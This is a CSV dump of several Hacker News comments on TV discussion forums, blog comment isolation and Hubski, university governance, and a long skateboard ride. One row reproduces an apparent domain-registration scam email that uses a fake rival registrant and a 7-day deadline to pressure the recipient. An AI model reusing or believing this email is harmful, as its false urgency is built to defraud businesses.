It's the same with TV shows; as soon as it's over (on a weekly schedule), people naturally want to discuss it at twop or tvtropes' forum or whatever.

5531601,comment,5531241,5531470,3,0,markkat,,,"One big problem with comments is the isolation. If I leave a comment on a blog, there's little chance that I will return to see responses to it, and I even if I do, it isn't part of my online persona. There's a very asymmetrical relationship between the author to his/her blog, and the commenter to his/her comment. That's why comments don't often match the level that content does.<p>We are currently experimenting with a solution to this on Hubski. We are allowing some blogs to mirror Hubski discussions of their content on their blog. Here's an example: <a href=""http://www.theadvancedapes.com/theratchet/2013/1/28/evolution-of-suicide"" rel=""nofollow"">http://www.theadvancedapes.com/theratchet/2013/1/28/evolutio...</a> I've long seen many bloggers append a post with ""discussion on HN"" or ""discussed on Reddit"". We decided to skip the link, and to allow the thread to be embedded. It's not so much a commenting platform as a mirror to the Hubski discussion. So far it seems to be working well, and we have a cue of blogs waiting to be added.<p>I should mention that users can follow or ignore users, tags, and domains on Hubski, and what they see is a result of what they follow. I don't think this would work on HN or Reddit, as no one would want every post from a given blog to be submitted automatically.",1365684989

One company named ""TianFeng Investment  Co.,Ltd"" had applied for the Brand Name ""rocketlease"" and some relevant domain names through our body.<p>Now we are handling this registration, and we found that the keyword of these domain names and Brand Name is identical with your company's. So now we need to confirm a couple of things with you:\n1. If your company consigns that company to register these domain names and Brand Name, we will send an application form to them and help them finish the registration at once.\n2. If your company has nothing to do with that company, they maybe have other purposes to register these domain names and Brand Name.<p>We haven't finished the registration of that company yet, and we have postponed the application of this company temporarily already. In order to deal with this issue better, please contact us by telephone or email as soon as possible.<p>In addition, we hereby affirm that our time limit for dissent application is 7 days. If your company files no dissent within the time limit, we will unconditionally approve the application submitted by that company.<p>Best Regards<p>Anna Liu\nRegional Manager<p>AnHui Office:\nPhone: 0086 551 6512 0117       \n    Fax: 0086 551 6512 3308 \nPostal Code:230022<p>Address:AnGao World Cities,No. 99,WangJiang West Road,HeFei,AnHui Province,China\nShangHai Headquarters:\nPostal Code:201315\nAddress:No.11,Lane 788,Xiupu Road,Nanhui District,ShangHai,China",1365684953

The people who control the means of production (in a university, that's the administrators who control resources and staffing) are more important than everyone else and will eat as large a portion of the pie as they can grab.<p>There are really only two ways out: labor struggle or cooperativization.  I recommend the latter, on grounds that it's actually the model traditional universities used: the faculty ran the university in check and balance with the trustees, who made ultra-high-level administrative decisions on behalf of the public and the future.  There's no reason not to simply undue the neoliberalization of academia and go back to the proven model.<p>In fact, and I want to EMPHASIZE this, the only reason any shift ever took place <i>away</i> from the proven model was a <i>concerted political attack</i> against academia during the Culture Wars.  Whatever you think of my obviously left-wing views in general, you have to admit that until politicians started getting elected on a platform of Stick It To Students, academia ran very well as a public institution funded by taxpayers and capital-asset grants (like land-grant colleges in the USA) and accountable primarily to voters, donors, and academics themselves.",1365682991

5531342,comment,5530044,5530044,3,0,rpicard,,,"A couple of weeks ago I was pretty bored and decided that I wanted to get out. I rode down the street to the grocery store on my board (about the size of a Penny board). After I went in and got some candy (Altoids actually) I decided to keep going to the end of the mall where the store is located. Once I got to the end, I found a sidewalk that went around this big lake and under the highway, so I followed it through a pitch black tunnel and when I ended up on the other side I just found where a road started and decided to follow it until it became a dead-end. After a while it did so I turned and followed the next one until it did too.<p>Around this time I decided to try and find my way back by going forward instead of retracing my path. I called a friend to ask him to check how far I was on Google Maps. He said I was around five miles away from where I started at this point, and offered to help me find my way back. I declined, since I still wanted to find it myself. After another long while I decided to call him again, and he said that I was now around nine miles away from where I had started.<p>I was getting tired and had thought that I would be pretty close at this point, so I asked him to give me directions to get back. When I finally got back I was tired, hungry, and so thirsty, but I had a really enjoyed my little adventure. It may seem silly since I was ultimately so close to where I live, but I had never been anywhere along that route so it really felt like an adventure of discovery.<p>After getting some food and something to drink, I retraced my route on Google Maps and it turns out that I had gone 21.7 miles. It took me around four hours.<p>Here's my route for anyone who is interested: <a href=""http://goo.gl/maps/Yvwwj"" rel=""nofollow"">http://goo.gl/maps/Yvwwj</a>",1365681785
